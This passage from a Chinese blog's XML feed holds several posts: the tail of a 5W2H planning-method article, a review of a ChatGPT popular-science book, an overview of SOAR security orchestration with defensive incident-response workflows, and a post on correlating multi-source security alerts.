much：应对风险需要投入多少资源和成本？对项目预算的影响是什么？</li></ul><p>5.项目总结与经验教训总结：在项目完成后，可以使用5W2H分析法来总结项目的经验和教训，为今后的项目提供参考。例如，可以回答以下问题：</p><ul><li>What：项目的目标和成果是什么？有哪些关键的阶段和任务？</li><li>When：项目的时间轴是怎样的？有哪些重要的时间节点和里程碑事件？</li><li>Where：项目的实施地点是怎样的？有哪些关键的区域和工作场所？</li><li>Who：谁参与了项目的实施？有哪些人员和团队做出了重要贡献或产生了影响？</li><li>Why：为什么项目能够成功或失败？有哪些关键因素或原因导致了这个结果？</li></ul><p>5W2H分析法在个人工作中的应用场景也是非常广泛的，例如：</p><ol><li>制定个人计划：在制定个人计划时，可以使用5W2H分析法来确保计划更加全面和具体，包括设定目标、分解任务、安排时间、评估资源、确定人员和评估成本等。</li><li>解决问题：在解决问题时，可以使用5W2H分析法来分析问题的各个方面，包括问题的原因、影响、解决方案、实施步骤和资源需求等。</li><li>做出决策：在做出决策时，可以使用5W2H分析法来评估各种选项的优缺点，包括选项的可行性、可靠性、经济性、社会效益和风险等。</li><li>项目管理：在项目管理中，可以使用5W2H分析法来制定项目计划、安排任务、协调资源、控制进度和评估质量等。</li><li>个人时间管理：在个人时间管理中，可以使用5W2H分析法来规划时间表、安排工作优先级、合理分配时间和评估工作效果等。</li></ol><p>5W2H分析方法在实际生活中有很多应用例子，以下是其中两小个例子：</p><p>1.计划一次周末旅行：</p><ul><li>Why 为了放松身心，增加生活体验，提升生活质量。</li><li>What 去一个风景优美的地方，欣赏自然风光，享受户外活动。</li><li>Where 选择一个适合户外活动的旅游目的地，例如山区、海滩或森林。</li><li>When 选择一个周末，安排好出发时间和返回时间。</li><li>Who 和家人或朋友一起去，共同体验旅行的乐趣。</li><li>How 制定详细的旅行计划，包括交通方式、住宿、餐饮和活动安排。</li><li>How much 预算合理的旅行费用，包括交通费、住宿费、餐饮费和活动费用。</li></ul><p>2.计划一次家庭装修：</p><ul><li>Why 为了提升家庭的生活品质和舒适度，改善家庭环境。</li><li>What 进行一次全面的家庭装修，包括水电改造、墙面地面装修、家具购置等。</li><li>Where 在家庭内进行装修，可能涉及多个房间和公共区域。</li><li>When 选择一个合适的时间段进行装修，例如假期或周末，合理安排工期。</li><li>Who 雇佣专业的装修公司或施工队伍进行装修，自己负责监督和协调。</li><li>How 制定详细的装修计划，包括材料采购、施工流程、装修风格和家具购置等。</li><li>How much 预算合理的装修费用，包括材料费、人工费、家具购置费等。</li></ul><p>总之，5W2H分析法可以帮助个人在工作和生活中更加全面地思考问题，制定更加具体和可行的计划或决策，提高工作效率和质量。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 管理 </category>
          
          <category> 项目管理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目管理 </tag>
            
            <tag> 学习方法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拥抱AI-ChatGPT:人类新纪元</title>
      <link href="/posts/5ce9b0c0/"/>
      <url>/posts/5ce9b0c0/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/ChatGPTlogo.png" alt="ChatGPT"></p><p>最近大模型通用智能应用持续发酵，各大科技公司都陆续推出了基于通用大模型的智能应用产品，典型的如OpenAI的ChatGPT、微软的BingChat、百度的文心一言、360的智脑、阿里的通义千问等。当然最火的要属于ChatGPT了，从去年年底推出到现在已经有很多人体验了，并惊叹于如今的人工智能已经发展到无所不知、无所不能的程度了。</p><p>市面上推出了很多介绍ChatGPT的书，覆盖了包括使用指南、原理说明、应用介绍等等各个方面。如果从一个以前从没了解过AI技术的小白想去初步了解ChatGPT不妨去看看《ChatGPT：人类新纪元》这本书。这本书是“搜狗输入法之父”，美团顾问，现任美团光年产品经理，被王兴称为“美团光年首席AGI布道师”马占凯马老师所著。虽然目前豆瓣评分6.8不算高，但是我个人认为作为ChatGPT的科普读物，包含了深入浅出的常识性的普及，以及对人工智能相关历史的概述和推演等，高度概括，其中还有很多有趣的故事，很好读，挺有价值的。这本书的定位就是科普，我觉得已经做到了。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/ChatGPT%E4%BA%BA%E7%B1%BB%E6%96%B0%E7%BA%AA%E5%85%83.png" alt="ChatGPT:人类新纪元"></p><p>经过一段时间对ChatGPT的使用，我逐步认同书中对“ChatGPT：人类新纪元”的提法。ChatGPT，如同人类历史上的单向门——火、文字、造纸、蒸汽机、电和计算机一样，ChatGPT的横空出世让大家看到了通用人工智能达到了崭新新的高度，标志着人类科技进步的又一重大里程碑，预示着我们正步入通用人工智能的新纪元。就像2007年乔布斯发布划时代的苹果智能手机iphone后，各种互联网移动应用蜂拥而至，大家再也离不开智能手机了，从此开始了移动互联的新纪元。</p><h2 id="一、ChatGPT之初体验"><a href="#一、ChatGPT之初体验" class="headerlink" title="一、ChatGPT之初体验"></a>一、ChatGPT之初体验</h2><p>对于一个码农，初接触ChatGPT时就想验证一下ChatGPT的编程功底，最近正好在研究用机器学习来识别心电图。如是问了一下ChatGPT如何用Python写一段心电图识别波形的代码。<br>看一下ChatGPT给我的答案：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/ChatGPT-%E4%BB%A3%E7%A0%81.png" alt="ChatGPT代码"></p><p>关键是这段代码稍作调整就可以运行起来。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/ChatGPT%E4%BB%A3%E7%A0%81%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.png" alt="chatGPT代码运行结果"><br>看上去效果还不错！</p><p>这可不是向搜素引擎一样搜出一堆的结果给出一堆的选项让我来选，而是真正的根据我的题意自己生成了一段可以执行的代码！这就有点牛逼了。</p><p>原来一直以为码农毕竟还是干技术活的，不会像那些从事简单重复劳动的活一样被AI所替代。但是看到ChatGPT给我的答案，又更进一步的加深了我的焦虑。本来就很卷的IT行业，还要和通用人工智能卷，估计用不了多久码农这个职业就会要消失了。</p><h2 id="二、ChatGPT与搜索引擎"><a href="#二、ChatGPT与搜索引擎" class="headerlink" title="二、ChatGPT与搜索引擎"></a>二、ChatGPT与搜索引擎</h2><p>有人认为ChatGPT就是搜索引擎的升级版，输入一些信息机器就给你反馈一些经过精细过滤后的信息。ChatGPT与搜索引擎完全是两类不同的东西。差别就和智能手机与以前的功能手机一样大。</p><p>ChatGPT是通过海量的数据学习后，具备真正具有智能能力的，给出的内容是根据自身的学习自动生成的。也就是我们常说的生成式AI，是一种能够从其训练数据中学习并生成新的、类似的数据或模型的机器学习技术。这种方法不依赖于预先定义的规则或模式，而是通过自我学习和适应来改进其性能。</p><p>与传统的AI相比，生成式AI的主要区别在于其学习方式和能力。传统的AI通常依赖于专家知识或编程指令来执行特定的任务。例如，一个图像识别系统可能被训练成只识别特定的图像类型，如猫或狗。然而，一旦这个系统遇到它从未见过的图像，它就无法做出正确的判断。</p><p>相反，生成式AI可以通过自我学习和适应来提高其性能。即使它从未见过某种类型的数据，它也可以通过分析大量的类似数据来学习如何处理这种数据。例如，ChatGPT通过海量的数据学习可以自动生成给出符合题意的答案。</p><p>而搜索引擎甚至连传统的AI都算不上，只是通过大数据的搜索算法将符合搜索条件的信息查询后返回到你，你还要根据自己的判断去识别和删选有用的信息。尤其是有了竞价模型后，可能搜索引擎给你的数据排名前几的都是对你来说没有什么用的，只是出价高的几个。</p><h2 id="三、机器学习与人类学习"><a href="#三、机器学习与人类学习" class="headerlink" title="三、机器学习与人类学习"></a>三、机器学习与人类学习</h2><p>机器学习其实是和人类学习是一样的。基本原理如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B.png" alt="学习模型"></p><p>机器学习的输入是海量的数据，通过模型的训练从数据中学习，生成并输出新的数据，根据输出的效果的进行评估和反馈来调整模型参数使模型的学习效果达到最优。</p><p>人类学习也是一样的，平时我们努力大量的看书、看视频、看其他资料、与人交流，其实都是在获取信息，将信息输入至大脑后，大脑经过思考输出结果，结果是对世界的认知、对人生的看法、对专业知识的领悟、输出一篇论文、输出一次演讲等等。也是对自己输出的结果进行评估和反馈来强化学习效果。</p><p>比如：学生通过大量的阅读和做题作为输入来学习知识，通过考试来评估学习效果，根据考试评估的结果来调整自己的学习方法策略来取得更好的学习成绩。</p><p>我们也是一样的，要想提高自己的认知和能力，就要通过<strong>大量的阅读（输入）</strong>、<strong>思考（学习）</strong>、<strong>不断的反思（反馈评估）</strong>、不断的思考<strong>调整学习方法策略等（优化模型参数）</strong>，最终提高自身的能力，可以有高水平的<strong>认知输出（输出）</strong>。</p><h2 id="四、智能涌现与从量变到质变"><a href="#四、智能涌现与从量变到质变" class="headerlink" title="四、智能涌现与从量变到质变"></a>四、智能涌现与从量变到质变</h2><p>“智能涌现” 是一个涵盖广泛领域的概念，它描述了在复杂系统中，智能行为或性能如何从简单组件或个体之间的互动中产生或 “涌现” 出来。在机器学习中，神经网络和深度学习模型可以通过大量的神经元之间的互连来实现智能任务。</p><p>在ChatGPT惊人的智能表现背后，就发生了智能涌现的现象。涌现现象是极为复杂的，因为复杂性科学就是复杂的，复杂是其基本特征。通俗的将就是当数据和模型参数达到一定的数量级后模型涌现出了新的完成任务的能力。</p><p>目前，在大模型的智能涌现方面，有三个结论。<br>第一，我们不知道什么时候会涌现某种新能力；<br>第二，我们不知道到一定规模时会涌现哪一种新的能力。<br>第三，我们唯一知道的是，只要数据量足够大，训练得足够深，一定会有涌现发生。</p><p>于是，我不禁又要拿出这张图：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/%E4%BB%8E%E9%87%8F%E5%8F%98%E5%88%B0%E8%B4%A8%E5%8F%98.png" alt="在这里插入图片描述"></p><p>这张图可以理解为从量变到质变的过程。在人类学习的过程中，学任何东西，如：学习英语，只要输入足够多通过<strong>大量的听说读写（数据量足够大）</strong>，<strong>投入的时间精力够多（训练得足够深）</strong>，一定会有拐点（涌现）发生，<strong>一定会成功</strong>，就像顿悟后开了挂一样。</p><p><strong>既然基于大模型的通用人工智能不可避免的来了，就让我们一起拥抱吧！</strong></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读后感 </tag>
            
            <tag> AI机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SOAR安全事件编排自动化响应-安全运营实战</title>
      <link href="/posts/30c4e5a0/"/>
      <url>/posts/30c4e5a0/</url>
      
        <content type="html"><![CDATA[<p>SOAR是最近几年安全市场上最火热的词汇之一。各个安全产商都先后推出了相应的产品，但大部分都用得不是很理想。SOAR不同与传统的安全设备，买来后实施部署就完事，SOAR是一个安全运营系统，是实现安全运营过程中人、工具、流程的有效协同，提高安全运营效率的平台。核心在于运营，在运营的过程中不断结合自身企业的安全情况，对接设备、优化剧本流程、制定相应的制度来发挥SOAR安全事件编排自动化响应系统的最大的效果。在安全运营实战过程中人员、工具、流程、制度一个都不能少。本文介绍如何通过SOAR安全事件编排自动化响应进行实战化的安全运营。</p><h2 id="一、企业安全运营的通点"><a href="#一、企业安全运营的通点" class="headerlink" title="一、企业安全运营的通点"></a>一、企业安全运营的通点</h2><p> <strong>1. 手段不足，事件响应时间长</strong><br>目前安全事件的处置常常需要涉及到不同部门、不同的安全设备之间的协同联动，依靠人工电话协同、邮件协同等手段，缺少统一的安全管理和自动化编排系统，不能将繁杂安全运行过程梳理为任务和剧本，把分散的安全工具与功能转化为可编程的应用和动作。人工方式协同事件长，效率低。</p><p> <strong>2. 单兵作战，安全运营效率低</strong><br>安全设备众多，多厂商多类型安全设备，无法有效的形成合力，每类设备都要有人单独的维护、监控、处置，无法形成合力。没有统一的运营系统，无法将团队、工具和流程的高度协同起来，覆盖安全运行的防护、检测、响应等各个环节，安全运营效率低。</p><p><strong>3. 人员匮乏,运营知识无积累</strong><br>安全运营往往借助于外部的安全运营支撑力量，尤其是重保期间过度依赖厂商资源，重保结束后并没有形成知识积累；另一方面由于安全运营人员匮乏，技能水平受困于重复性劳动难以提升，而优秀的工程师的经验也难以形成标准化的流程和动作。</p><h2 id="二、企业安全运营的目标"><a href="#二、企业安全运营的目标" class="headerlink" title="二、企业安全运营的目标"></a>二、企业安全运营的目标</h2><p>针对威胁事件及安全运营痛点问题，通过建设安全编排功能实现自动化响应处置能力，完成原来需要多人多系统多界面在线协同才能处置的安全任务，简化威胁管理难度，提升响应处置效率，保障应急处置质量。从防护、检测、响应、处置等维度，形成立体防护效果，提升网络安全自动化响应处置及统一作战指挥能力。</p><p><strong>1. 实现多场景剧本编排能力</strong><br>安全编排功能实现自动化响应处置，核心能力是要实现多场景的剧本灵活编排能力，通过可视化拖拽编排方式快速创建剧本，为安全处置提供上下文，避免传统运维要在不同页面间进行跳转切换，降低安全事件处置复杂度。剧本一旦创建成功启用，后续触发剧本的事件即可通过自动化方式进行处置，降低了不同部门间协同沟通、流程流转消耗的成本。解决现有安全事件处置依靠电话、邮件进行信息传递，依靠人工进行威胁处置慢的问题。</p><p><strong>2.具备灵活的设备对接能力</strong><br>打通告警、事件与安全处置设备之间已有的壁垒，消除异构环境下异构设备无法协同、联动的问题，提供标准化的处置派单接口，实现设备的处置联动。具备低代码开发和编排能力使安全设备快速的融入到剧本流程进行灵活调度。解决异构安全设备间集成、联动处置的问题，实现多源异构安全设备的联动处置能力提升。</p><p><strong>3. 基于实际运营的知识积累</strong><br>实现在安全运营过程的统一的数字化、标准化的安全运营管理流程，在实际的运营过程中将经验固化成剧本流程，以应对繁杂和重复的工作，降低安全事件处置管理成本，降低安全人员工作强度和工作经验能力等的高要求；记录安全事件数据，以可视化的形成评估处理结果，减少人员差异带来的不可控性，并减少对新安全运维分析人员的培训成本。</p><h2 id="三、SOAR的核心能力"><a href="#三、SOAR的核心能力" class="headerlink" title="三、SOAR的核心能力"></a>三、SOAR的核心能力</h2><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231018/SOAR%E6%9E%B6%E6%9E%84.png" alt="SOAR整体架构"></p><p>安全事件处置通过安全编排与自动化响应SOAR模块实现，SOAR对接安全大数据分析引擎分析的产生的安全事件或其他如态势感知、日志系统等安全设备的安全事件，通过灵活的剧本编排实现自动的派发工单、自动化分析处置、联动设备响应，实现数据交互与业务同步，促进人、工具、流程的协同，进一步推动自动化安全运营能力落地。SOAR应该具备三大核心能力，编排、自动化、响应，参见<a href="https://blog.csdn.net/fullbug/article/details/121089374" target="_blank" rel="noopener">《认识SOAR-安全事件编排自动化响应》</a></p><h3 id="编排"><a href="#编排" class="headerlink" title="编排"></a>编排</h3><p>SOAR中的关键词是编排，这是在使用自动化和响应之前必须构建的关键组件。SOAR的编排体现的是一种协调和决策的能力，针对复杂性的安全事件，通过编排将分析过程中各种复杂性分析流程和处理平台进行组合。分析涉及多种数据或平台，如SIEM分析平台、漏洞管理平台、情报数据、资产数据等。处置响应的编排也涉及到很多平台或设备，如EDR管理平台、运维管理平台、工单管理平台、WAF设备、防火墙等。仅仅以技术为中心的安全保障已不再能满足现状，将人员和流程的编排才能保证安全流程真正高效的运行。SOAR的终极目标就是实现技术、流程、人员的无缝编排。</p><h3 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h3><p>SOAR的自动化体现在三个方面，面对需要处理的安全事件能够根据策略自动选择编排的剧本、自动执行剧本的操作流程、根据决策结果自动联动设备进行防护阻断等行动策略。它允许剧本（常称为Playbooks）在安全流程的部分或全部内容上执行多个任务，将线性剧本串联起来。虽然线性剧本可能更容易创建，但只适用于处理决策需求较少的工作流。编排和自动化比线性剧本的最大优势就是其灵活性，为支持全自动化和半自动化的决策，需要更加灵活的工作流和执行剧本。SOAR能够识别这些决策模式，并基于以往事件中的执行操作，自动推荐新事件的剧本、执行剧本操作流程，自动化分析决策，根据决策结果自动下发防护阻断的行动策略。</p><h3 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h3><p>安全事件响应包括告警管理、工单管理、案件管理等功能。告警管理的核心不仅是对告警安全事件的收集、展示和响应，更强调告警分诊和告警调查。只有通过告警分诊和告警调查才能提升告警的质量，减少告警的数量。工单管理适用于中大型的安全运维团队协同化、流程化地进行告警处置与响应，并且确保响应过程可记录、可度量、可考核。案件管理是现代安全事件响应管理的核心能力。案件管理帮助用户对一组相关的告警进行流程化、持续化的调查分析与响应处置，并不断积累该案件相关的痕迹物证 (IOC) 和攻击者的战技过程指标信息 (TTP)。多个案件并行执行，从而持续化地对一系列安全事件进行追踪处置。</p><h2 id="四、SOAR的安全运营实战"><a href="#四、SOAR的安全运营实战" class="headerlink" title="四、SOAR的安全运营实战"></a>四、SOAR的安全运营实战</h2><p>SOAR的安全运营实战，是通过编排好的安全剧本实现人员、流程、工具与知识的贯穿，实现跨区域、跨组织、跨业务、跨设备（系统）安全事件高效运营。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231018/SOAR%E6%B5%81%E7%A8%8B.png" alt="整体流程"></p><p>在HW及日常安全运营工作中，针对安全设备的统一监控处置、员工办公电脑的安全告警处置、HW重保安全事件处置等典型场景已得到充分实战化应用，通过安全事件的统一管理，从防护、检测、响应、处置等维度，提高了处置效率。可以在实际的安全运营过程中不断的丰富和优化剧本流程。有效支撑网络安全事件运营工作持续向前发展。</p><h3 id="场景1：员工电脑中毒安全事件场景"><a href="#场景1：员工电脑中毒安全事件场景" class="headerlink" title="场景1：员工电脑中毒安全事件场景"></a>场景1：员工电脑中毒安全事件场景</h3><p>员工电脑中毒安全事件主要是由员工办公终端电脑EDR检测出的病毒、木马后门等恶意软件，SOAR平台对EDR的告警数据进行统一的采集分析，形成场景化事件后通过SOAR进行告警通知，敦促员工对办公电脑进行杀毒处置。</p><ul><li>业务流程<br>该流程为自动化的流程，SOAR平台接收到员工中毒的安全事件信息后，自动发邮件或发短信通知员工，员工收到告警通知信息后对自己的办公终端电脑进行杀毒处理。如果三天内还没有处理，将继续发邮件或短信进行通知告警。</li></ul><p>具体实战剧本流程如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231018/%E5%8A%9E%E5%85%AC%E7%94%B5%E8%84%91%E4%B8%AD%E6%AF%92%E5%A4%84%E7%BD%AE%E6%B5%81%E7%A8%8B.png" alt="员工电脑中毒安全事件"></p><ul><li>人员配置</li></ul><p>人员配置如下表所示：</p><table><thead><tr><th>序号</th><th>角色名称</th><th>所需技能</th><th>承担的工作内容</th></tr></thead><tbody><tr><td>1</td><td>企业员工</td><td>能够维护自己的办公终端电脑完成自己办公终端电脑的安全。</td><td>进行杀毒软件的安装、病毒库升级、杀毒扫描。</td></tr></tbody></table><h3 id="场景2：安全设备告警安全事件场景"><a href="#场景2：安全设备告警安全事件场景" class="headerlink" title="场景2：安全设备告警安全事件场景"></a>场景2：安全设备告警安全事件场景</h3><p>安全设备告警安全事件主要是由部署在网络环境下的主机安全检测设备、WAF、IPS、蜜罐等探针检测出的各类异常安全事件行为，SOC平台进行统一的采集、分析，最终形成场景化事件，进行派单处置的闭环管理。</p><ul><li>业务流程<br>1）一线监控人员发现在SOC平台上有触发的安全事件后，根据事件携带的原始安全日志信息进行初步研判分析；<br>2）如一线人员研判该事件为误报事件，则直接处置完成，同时记录事件相关的攻击特征值，进一步完善白名单；<br>3）如一线人员研判该事件为高风险事件，则将攻击IP地址报送至网络安全运营部安全员，由安全员进行IP地址封堵操作；<br>4）当网络安全运营部处置完毕后，通知一线监控人员结束该业务流程，最终形成闭环机制；<br>5）如一线人员无法研判该事件严重程度，则上升二线安全分析人员进行深入研判，二线安全分析人员将研判最终结果反馈至一线监控人员，再由一线监控人员根据实际情况选择下一步处置动作。</li></ul><p>具体实战剧本流程如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231018/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E4%BA%8B%E4%BB%B6%E7%9B%91%E6%8E%A7%E5%89%A7%E6%9C%AC%E6%B5%81%E7%A8%8B.png" alt="安全事件监控处置"></p><ul><li>人员配置</li></ul><p>人员配置如下表所示：</p><table><thead><tr><th>序号</th><th>角色名称</th><th>所需技能</th><th>承担的工作内容</th></tr></thead><tbody><tr><td>1</td><td>安全监控员</td><td>能够初步判断安全事件影响范围及基本的应急处理措施</td><td>完成简单安全事件的处置工作，督促业务部门完成安全事件处置，做好安全事件处置的全流程管控</td></tr><tr><td>2</td><td>二线运营员</td><td>能够根据安全数据上下文判断安全事件的可信度及影响范围，能够利用各种手段开展攻击溯源及应急响应</td><td>完成复杂安全事件的研判工作，为一线监控人员提供技术指导</td></tr><tr><td>3</td><td>部门安全员</td><td>能够掌握本部门各业务系统层面、主机层面的应急流程和实际处置操作方法</td><td>配合完成IP地址封堵操作</td></tr></tbody></table><h3 id="场景3：重保HW安全事件处置场景"><a href="#场景3：重保HW安全事件处置场景" class="headerlink" title="场景3：重保HW安全事件处置场景"></a>场景3：重保HW安全事件处置场景</h3><p>重保HW安全事件主要是由包括WAF设备、VPN、蜜罐、EDR、全流量等各类安全设备检测出的对重点关注的重要靶标系统的各类攻击行为，SOAR平台对这些安全告警事件进行统一的采集、分析，最终形成场景化事件，通过SOAR进行派单调用相关的插件工具进行告警通知、资产判断、情报查询、IP封堵、协同相应的人员进行研判处置等的闭环管理。</p><ul><li>业务流程<br>1）监控人员发现安全事件后，根据事件携带的原始安全日志信息进行初步研判分析；<br>2）如研判组通过溯源研判该事件为误报事件，则直接处置完成，同时记录事件相关的攻击特征值，进一步完善白名单；<br>3）如研判组研判该事件为高风险事件，则转处置组进行处置，由处置人员进行确定通过插件自动化实现IP地址封堵操作；<br>4）处置组处置完成后进行封堵IP入库，避免被封堵IP的重复告警。</li></ul><p>具体实战剧本流程如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231018/HW%E9%87%8D%E4%BF%9D%E5%AE%89%E5%85%A8%E5%A4%84%E7%BD%AE%E5%89%A7%E6%9C%AC%E6%B5%81%E7%A8%8B.png" alt="重保HW事件处置流程"></p><ul><li>人员配置</li></ul><p>人员配置如下表所示：</p><table><thead><tr><th>序号</th><th>角色名称</th><th>所需技能</th><th>承担的工作内容</th></tr></thead><tbody><tr><td>1</td><td>安全监控员</td><td>能够初步判断安全事件影响范围及基本的应急处理措施完成简单安全事件的处置工作，督促业务部门完成安全事件处置，做好安全事件处置的全流程管控</td><td></td></tr><tr><td>2</td><td>研判组</td><td>能够根据安全数据上下文判断安全事件的可信度及影响范围，能够利用各种手段开展攻击溯源及应急响应</td><td>完成复杂安全事件的研判工作，为一线监控人员提供技术指导</td></tr><tr><td>3</td><td>处置组</td><td>对IP进行封堵响应处置。</td><td>完成IP地址封堵操作</td></tr></tbody></table><p>因为SOAR具有灵活定义剧本的能力，在实际的运营中可以根据自身企业的实际情况，为自身企业量身定制符合自身管理制度要求和人员配置情况的安全运营剧本流程，除了事件处置以外还可以编排如资产稽核管理剧本、暴露面清查剧本、漏洞管理剧本、安全设备巡检剧本等等。</p><h3 id="相关制度要求"><a href="#相关制度要求" class="headerlink" title="相关制度要求"></a>相关制度要求</h3><p>(一)  企业应建立7*24小时网络安全监测和处置机制，对所辖网络设备和系统平台开展监测，对重要系统应开展专项监测，将安全监测和事件处置统一纳入安全运营中心，事件处置统一由SOAR安全事件编排自动化响应进行处置。</p><p>(二)  应将安全工单纳入SOAR工单管控体系。安全运营支撑单位督促安全工单各环节责任人响应和处置,按流程进行超时工单升级，开展工单闭环管控。</p><p>(三)  安全运营支撑单位应优化安全监控手段，按月开展告警分析，优化安全设备和平台告警规则，持续提升安全告警准确率。</p><p>(四)  安全运营支撑单位应持续关注内外部威胁情报，实时发布威胁预警，提供处置建议和技术支撑，跟踪问题解决,安全运营维护单位应及时评估威胁影响，根据处置建议制定处置方案并实施。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>告警繁杂迷人眼，多源分析见月明</title>
      <link href="/posts/1934f640/"/>
      <url>/posts/1934f640/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231007/1-%E5%91%8A%E8%AD%A6%E7%B9%81%E6%9D%82%E8%BF%B7%E4%BA%BA%E7%9C%BC.png" alt="告警繁杂迷人眼"></p><p>随着数字化浪潮的蓬勃兴起，网络安全问题日趋凸显，面对指数级增长的威胁和告警，传统的安全防御往往力不从心。网内业务逻辑不规范、安全设备技术不成熟都会导致安全设备触发告警。如何在海量众多安全告警中识别出真正的网络安全攻击事件成为安全运营的痛点问题。传统的分析手段，没有从威胁来源和攻击者视角来分析问题，从黑客攻击杀伤链来看，检测点和分析手段严重不足。因此需要从<strong>多源安全信息数据融合分析，实现网络攻击精准研判和处置</strong>。</p><p>从黑客攻击的视角，攻击手段多样，往往是多点突破，层层渗透。因此需要根据纵深防御的思路，在网络的出入口、在应用层、在主机层都要部署相应的安全防护检测设备。如：在企业互联网边界出口部署全流量监测设备，分析获取隐藏在流量中的恶意行为；在应用层部署WAF，分析应用层的攻击行为；在主机层面部署EDR，分析主机层面的异常行为。以攻击者的视角从网络攻击路径出发，对网络层、应用层、主机层的多源安全告警进行联动分析，精准确定安全攻击事件。</p><p>具体分析方法如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231007/2-%E5%A4%9A%E6%BA%90%E6%95%B0%E6%8D%AE%E8%9E%8D%E5%90%88%E5%88%86%E6%9E%90%E7%A0%94%E5%88%A4%E6%80%9D%E8%B7%AF.png" alt="多源数据融合分析精准研判思路"><center>多源数据融合分析精准研判思路</center></p><p><strong>1、多源数据采集</strong>。对全流量、WAF、主机安全等检测设备的告警数据进行采集，从告警数据中分析出攻击源IP、目的IP、源端口、目的端口、告警内容、告警级别、载荷信息等有效信息。并对告警数据过滤降噪，首先将源IP、目的IP、源端口、目的端口、告警内容相同的重复告警，以及告警级别为提醒的告警过滤掉。对剩下的告警进行针对性分析，针对告警级别为严重或致命的告警，根据告警内容和载荷信息筛选出潜在的针对性攻击。</p><p><strong>2、多源数据关联分析</strong>。总结人工研判经验，制定分析模型。如在不同层面的安全设备告警日志中发现相同的攻击源IP和目的IP在同一个时间段都产生了安全告警，说明既在网络侧发现了攻击行为又在应用侧和主机侧发现了攻击行为，通过不同层面告警数据的关联分析和交叉验证，可以确定该攻击是属于高可信的安全攻击事件。</p><p><strong>3、封堵处置，对攻击源进行封堵</strong>。为了避免错误的封堵影响业务，对源IP结合资产台账、黑白名单、情报数据等进行分析过滤，确定不会影响到业务后进行封堵处置。</p><p> 安全以“检测”为始，以“处置”为终。在攻击者对目标系统造成最终损害之前，制止损害或降低损失是信息安全体系的最终防线，也是及时响应的目标。以攻击者的视角从网络攻击的路径出发，对网络层、应用层、主机层的多源安全告警进行关联分析，精准确定安全攻击事件。在实战中，可通过以数据和情报驱动，采用自适应安全架构，嵌入工具、流程和策略来对抗新一代威胁。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python与正则表达式</title>
      <link href="/posts/994a1838/"/>
      <url>/posts/994a1838/</url>
      
